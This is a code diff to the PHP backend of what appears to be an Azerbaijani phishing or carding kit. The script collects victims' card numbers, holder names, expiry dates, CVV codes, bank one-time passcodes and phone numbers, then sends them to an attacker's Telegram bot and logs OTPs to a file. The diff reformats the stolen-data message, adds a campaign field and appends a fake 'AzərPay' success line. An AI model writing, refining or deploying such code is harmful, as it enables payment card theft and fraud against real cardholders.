@@ -19,27 +19,46 @@ $phone = isset($_POST['phone']) ? trim(strip_tags($_POST['phone'])) : 'Məlumat 
 $amount = isset($_POST['amount']) ? trim(strip_tags($_POST['amount'])) : 'Məlumat yoxdur';
 $ip = isset($_POST['ip']) ? trim(strip_tags($_POST['ip'])) : $_SERVER['REMOTE_ADDR'];
 $otp = isset($_POST['otp']) ? trim(strip_tags($_POST['otp'])) : 'Məlumat yoxdur';
+$campaign = isset($_POST['campaign']) ? trim(strip_tags($_POST['campaign'])) : '';
 
 $id = rand(1000, 9999);
 
-// MESAJ
-$message = "💳 YENİ KART MƏLUMATLARI 💳\n";
-$message .= "═══════════════════════════\n";
+// ============================================
+// 📝 TƏMİZ VƏ ANLAŞILAN MESAJ FORMATI
+// ============================================
+$message = "═══════════════════════════════════\n";
+$message .= "      💳 YENİ KART MƏLUMATLARI      \n";
+$message .= "═══════════════════════════════════\n\n";
+
+$message .= "📌 SİFARİŞ MƏLUMATLARI\n";
+$message .= "───────────────────────────────\n";
 $message .= "🆔 Sifariş ID: #" . $id . "\n";
 $message .= "📱 Operator: " . $operator . "\n";
-$message .= "📞 Nömrə: " . $phone . "\n";
+$message .= "📞 Telefon: " . $phone . "\n";
 $message .= "💰 Məbləğ: " . $amount . " AZN\n";
-$message .= "═══════════════════════════\n";
+if (!empty($campaign)) {
+    $message .= "📦 Paket: " . $campaign . "\n";
+}
+$message .= "───────────────────────────────\n\n";
+
+$message .= "💳 KART MƏLUMATLARI\n";
+$message .= "───────────────────────────────\n";
 $message .= "💳 Kart Nömrəsi: " . $cardNumber . "\n";
 $message .= "👤 Kart Sahibi: " . $cardName . "\n";
 $message .= "📅 Bitiş Tarixi: " . $cardExpiry . "\n";
-$message .= "🔐 CVV: " . $cardCvv . "\n";
-$message .= "═══════════════════════════\n";
+$message .= "🔐 CVV Kodu: " . $cardCvv . "\n";
+$message .= "───────────────────────────────\n\n";
+
+$message .= "🔐 TƏSDİQ MƏLUMATLARI\n";
+$message .= "───────────────────────────────\n";
 $message .= "🔑 OTP Kodu: " . $otp . "\n";
 $message .= "🌐 IP Ünvan: " . $ip . "\n";
-$message .= "═══════════════════════════\n";
 $message .= "⏰ Vaxt: " . date('d.m.Y H:i:s') . "\n";
-$message .= "═══════════════════════════";
+$message .= "───────────────────────────────\n\n";
+
+$message .= "📱 BAĞLI NÖMRƏ: " . $phone . "\n";
+$message .= "═══════════════════════════════════\n";
+$message .= "✅ AzərPay ilə uğurlu əməliyyat!";
 
 // TELEGRAM-A GÖNDƏR
 $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
@@ -63,7 +82,7 @@ $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
 curl_close($ch);
 
 // LOG
-$logData = date('Y-m-d H:i:s') . " | IP: $ip | OTP: $otp | HTTP: $httpCode\n";
+$logData = date('Y-m-d H:i:s') . " | ID: #$id | IP: $ip | OTP: $otp | HTTP: $httpCode\n";
 file_put_contents('telegram_log.txt', $logData, FILE_APPEND);
 
 // CAVAB
